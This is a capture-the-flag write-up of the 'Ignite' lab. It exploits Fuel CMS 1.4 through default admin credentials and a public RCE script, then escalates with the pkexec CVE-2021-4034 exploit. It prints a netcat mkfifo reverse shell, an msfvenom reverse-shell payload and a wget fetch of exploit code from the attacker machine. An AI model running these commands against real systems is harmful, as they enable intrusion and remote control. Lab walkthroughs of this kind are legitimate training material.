# Ignite
A new start-up has a few issues with their web server.
Goal
- User.txt
- Root.txt
## Steps
- Nmap first to see open services

![Pasted image 20251002212118.png](thm_pics/Pasted%20image%2020251002212118.png)

- The website title is Fuel, and it has 1 disallowed entry in robots.txt file called "/fuel"
- The service version is Apache httpd 2.4.18

![Pasted image 20251002212258.png](thm_pics/Pasted%20image%2020251002212258.png)

- Its Fuel CMS version 1.4
- now, lets use gobuster to find directories
- Command : `gobuster dir -u http://10.10.96.244 -w /usr/share/wordlists/dirb/common.txt`

![Pasted image 20251002212719.png](thm_pics/Pasted%20image%2020251002212719.png)

- Also, on the website, it says to access the FUEL admin, go to this link, so i proceed to click on it. And it says the email and password is admin

![Pasted image 20251002213002.png](thm_pics/Pasted%20image%2020251002213002.png)

![Pasted image 20251002213032.png](thm_pics/Pasted%20image%2020251002213032.png)

- The login panel appears and i can login using username : admin and password : admin

![Pasted image 20251002213149.png](thm_pics/Pasted%20image%2020251002213149.png)

- it worked
- I searched for the exploit in searchsploit and found remote code execution exploits (and the target's fuel CMS version is 1.4, so maybe we can use these)

![Pasted image 20251002212656.png](thm_pics/Pasted%20image%2020251002212656.png)

- I'll use the 3rd one first
- I executed by "`python3 50477.py -u http://10.10.96.244/`"

![Pasted image 20251002214101.png](thm_pics/Pasted%20image%2020251002214101.png)

- so i can execute command remotely
- I cannot find either of the files

![Pasted image 20251002214415.png](thm_pics/Pasted%20image%2020251002214415.png)

- I should try to do privilege escalation 
- First, i will try to find files with SUID bit set
- Command : `find / -type f -perm -04000 -ls 2>/dev/null`

![Pasted image 20251002214814.png](thm_pics/Pasted%20image%2020251002214814.png)

- what is **pkexec**? havent heard of it, so i searched on google

![Pasted image 20251002214953.png](thm_pics/Pasted%20image%2020251002214953.png)

- Ohh i see, maybe i have to understand how it works
- So pkexec - **Execute a command as another user**
- I tried to search for privilege escalation payload on the internet and found this github
- https://github.com/arthepsy/CVE-2021-4034

![Pasted image 20251002220745.png](thm_pics/Pasted%20image%2020251002220745.png)

- I will send the exploit code to the target by hosting simple python file from my attacker machine and wget it from the target
- Command on my attacking machine :  `python3 -m http.server 80`
- Command on target : `wget -O /tmp/cve2021.c http://10.23.125.244:80/cve-2021-4034-poc.c`

![Pasted image 20251002221701.png](thm_pics/Pasted%20image%2020251002221701.png)

- It got uploaded in /tmp directory and i compiled it in the current directory
- I will try running the commands specified in this **github repo** (compile)

![Pasted image 20251002221929.png](thm_pics/Pasted%20image%2020251002221929.png)

- lol why it didnt work (because **we dont have the shell!**)
- I tried to execute reverse shell by setting up listener but the shell wouldnt connect with the listener when i tried to -e /bin/bash. If nc normally, it would still connect
- So, the next step is to transfer payload to the target using **msfvenom**
- i checked the target architecture
	- Command : uname -m
	- Answer : 64-bit
- Command : `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.23.125.244 LPORT=4141 -f elf -o pwn.elf`
- Uploaded it to the target and change chmod +x to allow executing
- Set up listener on our attacking machine
- Didnt work again!
- Maybe i tried using **Reverse shell generator** to help me generate the right payload
- This worked :  `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.23.125.244 4141 >/tmp/f` 
- Maybe because nc doesn't enable -e for security reason

![Pasted image 20251002234424.png](thm_pics/Pasted%20image%2020251002234424.png)

- Now, we can try executing the **cve2021** file again

![Pasted image 20251002234539.png](thm_pics/Pasted%20image%2020251002234539.png)

- Thats more like it!
- Now, lets find User.txt and Root.txt

![Pasted image 20251002234657.png](thm_pics/Pasted%20image%2020251002234657.png)

![Pasted image 20251002234944.png](thm_pics/Pasted%20image%2020251002234944.png)

- Command : `ls -la /root`
- found the root file!
- since find command somehow didnt work, maybe lets try searching for common places for user.txt
- I found flag file in : `cat /home/www-data/flag.txt`
- Its not User.txt tho but its somehow the correct answer
- Done
- This website : https://www.revshells.com/ saved my life